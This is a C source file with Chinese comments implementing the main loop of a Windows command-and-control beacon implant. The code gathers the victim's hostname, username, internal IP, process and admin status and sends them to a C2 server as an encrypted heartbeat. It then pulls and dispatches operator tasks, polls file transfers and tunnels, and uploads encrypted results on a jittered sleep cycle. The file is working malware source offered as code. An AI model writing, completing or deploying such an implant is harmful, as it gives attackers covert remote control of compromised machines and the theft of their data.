#include "beacon_agent.h"

#include "beacon_commands.h"
#include "beacon_context.h"
#include "beacon_crypto.h"
#include "beacon_packet.h"
#include "beacon_sleep.h"
#include "beacon_transport.h"

#pragma comment(lib, "ws2_32.lib")

/*
 * Agent 层是 Beacon 的主循环：
 * 构建元数据心跳、拉取任务、调用 dispatcher、轮询异步子系统并上传结果。
 */

/* 构建元数据载荷 */
static ByteBuf BuildMetadataPayload(const BeaconContext* ctx)
{
    ByteBuf p;

    BbInit(&p);
    BbString(&p, ctx->meta.os);
    BbString(&p, ctx->meta.arch);
    BbString(&p, ctx->meta.hostname);
    BbString(&p, ctx->meta.username);
    BbString(&p, ctx->meta.internal_ip);
    BbString(&p, ctx->meta.process_name);
    BbU32(&p, ctx->meta.pid);
    BbU8(&p, (UINT8)(ctx->meta.is_admin ? 1 : 0));
    BbU32(&p, ctx->meta.acp);
    BbU32(&p, (UINT32)(ctx->profile.sleep_ms / 1000));
    BbU32(&p, (UINT32)ctx->profile.jitter);

    return p;
}

/* 构建明文心跳 */
static ByteBuf BuildHeartbeatPlain(const BeaconContext* ctx)
{
    ByteBuf meta = BuildMetadataPayload(ctx);
    ByteBuf p = PacketPackHeartbeat(ctx->beacon_id, ctx->session_key, sizeof(ctx->session_key), &meta);

    BbFree(&meta);
    return p;
}

/* 检查响应体是否为默认的 404 内容 */
static INT IsNotFoundBody(const ByteBuf* b)
{
    static const CHAR text[] = "404 page not found";
    return b->len == sizeof(text) - 1 && memcmp(b->data, text, b->len) == 0;
}

/* 解密并分发任务 */
static VOID DispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks)
{
    ByteBuf plain;
    Parser outer;

    /* 跳过空响应和 404 响应 */
    if (!encrypted_tasks->len || IsNotFoundBody(encrypted_tasks)) {
        return;
    }

    /* 解密任务数据 */
    if (!CryptoDecryptTask(ctx->session_key, sizeof(ctx->session_key), encrypted_tasks, &plain)) {
        return;
    }

    ParserInit(&outer, plain.data, plain.len);

    /* 逐个解析任务块 */
    while (ParserLeft(&outer) > 0 && !outer.error[0]) {
        ByteBuf task_block = ParserBytes(&outer);
        Parser task;
        UINT32 task_id;
        UINT32 command_id;
        ByteBuf payload;
        PacketList results;
        SIZE_T i;

        if (outer.error[0]) {
            BbFree(&task_block);
            break;
        }

        /* 解析任务头：task_id + command_id + payload */
        ParserInit(&task, task_block.data, task_block.len);
        task_id = ParserU32(&task);
        command_id = ParserU32(&task);
        payload = ParserBytes(&task);

        /* 将解析器错误作为状态数据包返回 */
        if (task.error[0]) {
            ByteBuf e = BbFromText(task.error);
            ByteBuf f = PacketMakeFinal(task_id, command_id, &e);
            OutboxEnqueue(&ctx->outbox, f);
            BbFree(&e);
            BbFree(&task_block);
            BbFree(&payload);
            continue;
        }

        /* 分发命令并收集结果 */
        results = CommandDispatch(ctx, task_id, command_id, &payload);

        /* 将结果数据包入队到发件箱 */
        for (i = 0; i < results.count; ++i) {
            if (results.items_are_final) {
                ByteBuf moved = results.items[i];
                BbInit(&results.items[i]);
                OutboxEnqueue(&ctx->outbox, moved);
            } else {
                ByteBuf f = PacketMakeFinal(task_id, command_id, &results.items[i]);
                OutboxEnqueue(&ctx->outbox, f);
            }
        }

        /* 检查命令是否请求退出 */
        if (results.should_exit) {
            ctx->active = 0;
        }

        PlistFree(&results);
        BbFree(&task_block);
        BbFree(&payload);
    }

    BbFree(&plain);
}

/* 轮询文件传输结果 */
static VOID FlushTransfers(BeaconContext* ctx)
{
    PacketList out = TransferPoll(ctx);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 轮询隧道数据 */
static VOID FlushTunnels(BeaconContext* ctx)
{
    PacketList out = TunnelPoll(&ctx->tunnels);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 加密并发送所有出站数据包 */
static VOID FlushOutbox(BeaconContext* ctx, const ByteBuf* heartbeat)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur = list;

    while (cur) {
        ByteBuf encrypted;
        ByteBuf response;

        /* 加密当前数据包 */
        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
            OutboxPushFrontList(&ctx->outbox, cur);
            return;
        }

        /* 将数据包发送到 C2 服务器 */
        if (!TransportHttpExchange(&ctx->profile, heartbeat, &encrypted, &response)) {
            BbFree(&encrypted);
            OutboxPushFrontList(&ctx->outbox, cur);
            return;
        }

        BbFree(&encrypted);
        BbFree(&response);

        /* 释放已发送的节点并继续 */
        {
            OutboxNode* done = cur;
            cur = cur->next;
            OutboxFreeNode(done);
        }
    }
}

/* 初始化 Agent 结构体、Win32 API 解析及 Winsock */
INT AgentInit(Agent* agent)
{
    if (!agent) {
        return 0;
    }

    SecureZeroMemory(agent, sizeof(*agent));

    ContextInit(&agent->ctx);

    /* ContextInit 会清零 BeaconContext，API 解析必须在它之后执行。 */
    if (!Win32ApiInit(&agent->ctx.api)) {
        ContextFree(&agent->ctx);
        return 0;
    }

    if (WSAStartup(MAKEWORD(2, 2), &agent->wsa) != 0) {
        ContextFree(&agent->ctx);
        return 0;
    }
    agent->wsa_started = 1;

    agent->initialized = 1;
    agent->stop = 0;
    return 1;
}

/* 释放 Agent 资源并清理 Winsock */
VOID AgentFree(Agent* agent)
{
    if (!agent) {
        return;
    }

    if (agent->initialized) {
        ContextFree(&agent->ctx);
        agent->initialized = 0;
    }

    if (agent->wsa_started) {
        WSACleanup();
        agent->wsa_started = 0;
    }
}

/* 信标主循环：心跳、任务分发、结果上传 */
INT AgentRun(Agent* agent)
{
    BeaconContext* ctx;

    if (!agent || !agent->initialized) {
        return -1;
    }

    ctx = &agent->ctx;

    DebugPrintf("[*] Beacon modular C starting...\n");
    DebugPrintf("[*] Metadata: OS=%s Arch=%s User=%s IP=%s\n",
                ctx->meta.os, ctx->meta.arch, ctx->meta.username, ctx->meta.internal_ip);
    DebugPrintf("[*] BeaconID: %lu\n", (unsigned long)ctx->beacon_id);

    /* 主循环：心跳、接收任务、处理、上传结果 */
    while (ctx->active && InterlockedCompareExchange(&agent->stop, 0, 0) == 0) {
        ByteBuf plain;
        ByteBuf heartbeat;
        ByteBuf response;

        BeaconSleep(ctx);

        /* 构建并加密心跳 */
        plain = BuildHeartbeatPlain(ctx);
        if (!CryptoEncryptHeartbeat(ctx->profile.http.encrypt_key, &plain, &heartbeat)) {
            BbFree(&plain);
            continue;
        }
        BbFree(&plain);

        /* 与 C2 服务器交换数据 */
        if (TransportHttpExchange(&ctx->profile, &heartbeat, NULL, &response)) {
            DispatchTasks(ctx, &response);
            FlushTransfers(ctx);
            FlushTunnels(ctx);
            FlushOutbox(ctx, &heartbeat);
            BbFree(&response);
        }

        BbFree(&heartbeat);
    }

    return 0;
}

/* 请求 Agent 停止 */
VOID AgentStop(Agent* agent)
{
    if (agent) {
        InterlockedExchange(&agent->stop, 1);
    }
}
